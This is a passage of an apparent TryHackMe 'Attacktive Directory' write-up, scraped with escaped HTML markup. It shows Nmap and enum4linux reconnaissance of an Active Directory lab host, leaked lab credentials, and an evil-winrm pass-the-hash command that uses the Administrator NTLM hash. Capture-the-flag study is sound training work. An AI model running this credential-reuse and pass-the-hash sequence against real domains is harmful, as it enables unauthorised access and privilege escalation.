\\\nspookysec.local/backup:backup2517860@THM-AD\n(I got a bit tripped up here, as I didn’t read secretsdump.py’s output carefully enough — credentials are presented in the format domain\\uid:rid:lmhash:nthash, so the relevant NTLM hash is the last hash for the Administrator account!)\nWe’ll use the Evil-WinRM tool to retrieve the final flag by passing the hash.\nevil-winrm --ip 10.10.177.198 --user Administrator \\\n           --hash 0e0363213e37b94221497260b0bcb4fc\nThe final flag is in a file called root.txt on the Administrator account’s desktop.\nElapsed Time: 2 h 38 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/attacktivedirectory&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Attacktive Directory” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=&quot;welcome-to-attacktive-directory&quot;&gt;Welcome to Attacktive Directory&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#welcome-to-attacktive-directory&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;As usual, we start off with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan. Our target IP address is 10.10.177.198.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; attacktive-directory&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This gives us the following results.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Thu Dec 30 20:16:35 2021 as: nmap -v -oA attacktive-directory -Pn -A -T4 -sS -script vuln -p- 10.10.177.198\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nIncreasing send delay for 10.10.177.198 from 0 to 5 due to 2065 out of 5162 dropped probes since last increase.\nIncreasing send delay for 10.10.177.198 from 5 to 10 due to 11 out of 14 dropped probes since last increase.\nNmap scan report for 10.10.177.198\nHost is up (0.18s latency).\nNot shown: 65507 closed tcp ports (reset)\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-server-header: Microsoft-IIS/10.0\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-31 03:31:28Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n|_ssl-ccs-injection: No reply from server (TIMEOUT)\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-dombased-xss: Couldn&#039;t find any DOM based XSS.\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49675/tcp open  msrpc         Microsoft Windows RPC\n49679/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\n49823/tcp open  msrpc         Microsoft Windows RPC\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=12/30%OT=53%CT=1%CU=35966%PV=Y%DS=4%DC=T%G=Y%TM=61CE7D\nOS:75%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS\nOS:=U)OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NN\nOS:S%O6=M506NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y\nOS:%DF=Y%T=80%W=FFFF%O=M506NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD\nOS:=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%\nOS:S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD\nOS:=Z)\n\nNetwork Distance: 4 hops\nTCP Sequence Prediction: Difficulty=261 (Good luck!)\nIP ID Sequence Generation: Incremental\nService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_smb-vuln-ms10-054: false\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   34.37 ms  10.13.0.1\n2   ... 3\n4   183.65 ms 10.10.177.198\n\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Dec 30 20:48:05 2021 -- 1 IP address (1 host up) scanned in 1890.41 seconds\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;We’ll use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/enum4linux&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; to gather some additional information from the Samba shares (139/445) on the target.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;enum4linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.177.198&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This produces a lot of noise (I’ve all of the output to STDERR below) as the target is fairly locked down. But there’s a few interesting things here.&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 30 20:55:33 2021\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.10.177.198\nRID Range ........ 500-550,1000-1050\nUsername ......... &#039;&#039;\nPassword ......... &#039;&#039;\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n ===================================================== \n|    Enumerating Workgroup/Domain on 10.10.177.198    |\n ===================================================== \n[E] Can&#039;t find workgroup/domain\n\n ============================================= \n|    Nbtstat Information for 10.10.177.198    |\n ============================================= \nLooking up status of 10.10.177.198\nNo reply from 10.10.177.198\n\n ====================================== \n|    Session Check on 10.10.177.198    |\n ====================================== \n[+] Server 10.10.177.198 allows sessions using username &#039;&#039;, password &#039;&#039;\n[+] Got domain/workgroup name: \n\n ============================================ \n|    Getting domain SID for 10.10.177.198    |\n ============================================ \nDomain Name: THM-AD\nDomain Sid: S-1-5-21-3591857110-2884097990-301047963\n[+] Host is part of a domain (not a workgroup)\n\n ======================================= \n|    OS information on 10.10.177.198    |\n ======================================= \n[+] Got OS info for 10.10.177.198 from smbclient: \n[+] Got OS info for 10.10.177.198 from srvinfo:\nCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n ============================== \n|    Users on 10.10.177.198    |\n ============================== \n[E] Couldn&#039;t find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n\n[E] Couldn&#039;t find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n\n ========================================== \n|    Share Enumeration on 10.10.177.198    |\n ========================================== \ndo_connect: Connection to 10.10.177.198 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\n\n\tSharename       Type      Comment\n\t---------       ----      -------\nReconnecting with SMB1 for workgroup listing.\nUnable to connect with SMB1 -- no workgroup available\n\n[+] Attempting to map shares on 10.10.177.198\n\n ===================================================== \n|    Password Policy Information for 10.10.177.198    |\n ===================================================== \n[E] Unexpected error from polenum:\n\n[+] Attaching to 10.10.177.198 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n\t[!] Protocol failed: Cannot request session (Called Name:10.10.177.198)\n\n[+] Trying protocol 445/SMB...\n\n\t[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n\n[E] Failed to get password policy with rpcclient\n\n =============================== \n|    Groups on 10.10.177.198    |\n =============================== \n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ======================================================================== \n|    Users on 10.10.177.198 via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================== \n[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963\n[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833\n[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username &#039;&#039;, password &#039;&#039;\nS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\\Administrator (Local User)\nS-1-5-21-3591857110-2884097990-301047963-501 THM-AD\\Guest (Local User)\nS-1-5-21-3591857110-2884097990-301047963-502 THM-AD\\krbtgt (Local User)\nS-1-5-21-3591857110-2884097990-301047963-503 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-504 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-505 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-506 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-507 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-508 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-509 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-510 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-511 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-512 THM-AD\\Domain Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-513 THM-AD\\Domain Users (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-514 THM-AD\\Domain Guests (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-515 THM-AD\\Domain Computers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-516 THM-AD\\Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-517 THM-AD\\Cert Publishers (Local Group)\nS-1-5-21-3591857110-2884097990-301047963-518 THM-AD\\Schema Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-519 THM-AD\\Enterprise Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-520 THM-AD\\Group Policy Creator Owners (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-521 THM-AD\\Read-only Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-522 THM-AD\\Cloneable Domain Controllers (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-523 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-524 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-525 THM-AD\\Protected Users (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-526 THM-AD\\Key Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-527 THM-AD\\Enterprise Key Admins (Domain Group)\nS-1-5-21-3591857110-2884097990-301047963-528 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-529 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-530 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-531 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-532 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-533 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-534 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-535 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-536 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-537 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-538 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-539 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-540 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-541 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-542 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-543 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-544 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-545 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-546 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-547 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-548 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-549 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-550 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\\ATTACKTIVEDIREC$ (Local User)\nS-1-5-21-3591857110-2884097990-301047963-1001 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1002 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1003 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1004 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1005 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1006 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1007 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1008 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1009 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1010 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1011 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1012 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1013 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1014 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1015 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1016 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1017 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1018 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1019 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1020 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1021 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1022 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1023 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1024 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1025 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1026 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1027 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1028 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1029 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1030 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1031 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1032 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1033 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1034 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1035 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1036 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1037 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1038 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1039 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1040 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1041 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1042 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1043 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1044 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1045 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1046 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1047 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1048 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1049 *unknown*\\*unknown* (8)\nS-1-5-21-3591857110-2884097990-301047963-1050 *unknown*\\*unknown* (8)\n[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username &#039;&#039;, password &#039;&#039;\nS-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\\Administrator (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\\Guest (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-502 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\\DefaultAccount (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\\WDAGUtilityAccount (Local User)\nS-1-5-21-3532885019-1334016158-1514108833-505 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-506 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-507 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-508 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-509 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-510 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-511 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-512 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\\None (Domain Group)\nS-1-5-21-3532885019-1334016158-1514108833-514 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-515 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-516 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-517 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-518 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-519 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-520 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-521 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-522 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-523 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-524 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-525 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-526 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-527 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-528 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-529 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-530 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-531 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-532 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-533 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-534 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-535 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-536 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-537 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-538 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-539 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-540 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-541 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-542 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-543 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-544 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-545 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-546 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-547 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-548 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-549 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-550 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1000 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1001 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1002 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1003 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1004 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1005 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1006 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1007 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1008 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1009 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1010 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1011 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1012 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1013 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1014 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1015 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1016 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1017 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1018 *unknown*\\*unknown* (8)\nS-1-5-21-3532885019-1334016158-1514108833-1019 *unknown*\\*unknown* 